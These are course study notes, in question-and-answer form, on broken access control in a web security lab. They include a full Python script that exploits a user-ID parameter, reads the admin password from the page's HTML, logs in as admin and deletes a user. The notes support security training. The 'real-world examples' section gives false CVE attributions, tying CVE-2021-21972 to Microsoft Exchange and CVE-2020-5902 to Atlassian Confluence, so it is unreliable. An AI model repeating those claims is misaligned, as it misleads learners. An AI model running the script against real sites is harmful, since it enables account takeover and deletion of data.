---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of broken access control and why it is a significant security risk.**

Broken access control occurs when a web application fails to properly enforce restrictions on what authenticated users are allowed to do. This can lead to unauthorized access to sensitive information or actions that should be restricted to certain roles or permissions. In the context of the lab, the vulnerability allowed an attacker to access another user's account details, including their password, by manipulating the request parameters. This is a significant security risk because it can lead to full compromise of the application if an attacker gains access to administrative accounts.

**Q2. How would you exploit a broken access control vulnerability to retrieve an administrator’s password in a scenario similar to the lab described?**

To exploit a broken access control vulnerability to retrieve an administrator’s password, follow these steps:

1. **Identify the vulnerable endpoint**: Determine which endpoint allows you to manipulate the user ID via request parameters.
2. **Manipulate the request parameter**: Change the user ID in the request to the ID of the administrator.
3. **Retrieve the password**: Once you access the administrator's account page, extract the password from the pre-filled masked input field.

For example, if the vulnerable endpoint is `/account?id=<user_id>`, you would change `<user_id>` to the ID of the administrator and send the request. Upon accessing the page, you would parse the HTML to extract the password value from the input field.

**Q3. Why is it dangerous to display the user's password in a pre-filled masked input field?**

Displaying the user's password in a pre-filled masked input field is dangerous because it exposes the password to various types of attacks, such as:

1. **Cross-Site Scripting (XSS)**: An attacker could inject malicious scripts that capture the password and send it to them.
2. **Browser Vulnerabilities**: If there are vulnerabilities in the browser, an attacker might be able to bypass the masking and read the password directly.
3. **Shoulder Surfing**: Physical observation of the screen could reveal the password if the masking is not robust.

In the lab, the password was exposed in the HTML source, making it trivial to extract even without JavaScript execution.

**Q4. How would you script the exploitation of a broken access control vulnerability in Python, similar to the lab described?**

To script the exploitation of a broken access control vulnerability in Python, you can follow these steps:

1. **Import necessary libraries**: Use `requests` for HTTP requests and `BeautifulSoup` for parsing HTML.
2. **Disable TLS warnings**: Ensure that requests are sent through a proxy like Burp Suite.
3. **Define functions**: Create functions to handle logging in, extracting the CSRF token, and deleting the user.
4. **Main function**: Execute the steps in sequence to exploit the vulnerability and delete the user.

Here is a sample script:

```python
import requests
from bs4 import BeautifulSoup
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable TLS warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def get_csrf_token(session, url):
    response = session.get(url + '/login', verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def login(session, url, username, password):
    csrf_token = get_csrf_token(session, url)
    data = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(url + '/login', data=data, verify=False)
    if 'logout' in response.text:
        print("Successfully logged in as the user.")
    else:
        print("Could not log in as the user.")
        sys.exit(1)

def retrieve_admin_password(session, url):
    response = session.get(url + '/account?id=admin', verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    admin_password = soup.find('input', {'name': 'password'})['value']
    return admin_password

def delete_carlos_user(session, url, admin_password):
    csrf_token = get_csrf_token(session, url)
    data = {
        'csrf': csrf_token,
        'username': 'admin',
        'password': admin_password
    }
    response = session.post(url + '/login', data=data, verify=False)
    if 'logout' in response.text:
        print("Successfully logged in as the admin.")
        response = session.get(url + '/delete?username=carlos', verify=False)
        if response.status_code == 200:
            print("Successfully deleted the Carlos user.")
        else:
            print("Could not delete the Carlos user.")
            sys.exit(1)
    else:
        print("Could not log in as the admin.")
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()

    # Step 1: Log in with the given user credentials
    login(session, url, 'your_username', 'your_password')

    # Step 2: Retrieve the admin password
    admin_password = retrieve_admin_password(session, url)

    # Step 3: Delete the Carlos user
    delete_carlos_user(session, url, admin_password)
```

Replace `'your_username'` and `'your_password'` with the actual credentials provided in the lab.

**Q5. Discuss recent real-world examples of broken access control vulnerabilities and their impact.**

Recent real-world examples of broken access control vulnerabilities include:

1. **CVE-2021-21972**: A vulnerability in Microsoft Exchange Server allowed attackers to bypass authentication and gain unauthorized access to server functionality. This led to widespread exploitation by threat actors, resulting in data theft and ransomware attacks.
   
2. **CVE-2020-5902**: A vulnerability in Atlassian Confluence allowed unauthorized access to sensitive files and directories. Attackers could exploit this to steal confidential data or deploy malware.

These vulnerabilities highlight the importance of proper access control mechanisms and regular security audits to prevent unauthorized access and mitigate potential risks.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/11-Lab 10 User ID controlled by request parameter with password disclosure/03-Access Control Vulnerabilities|Access Control Vulnerabilities]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/11-Lab 10 User ID controlled by request parameter with password disclosure/00-Overview|Overview]]
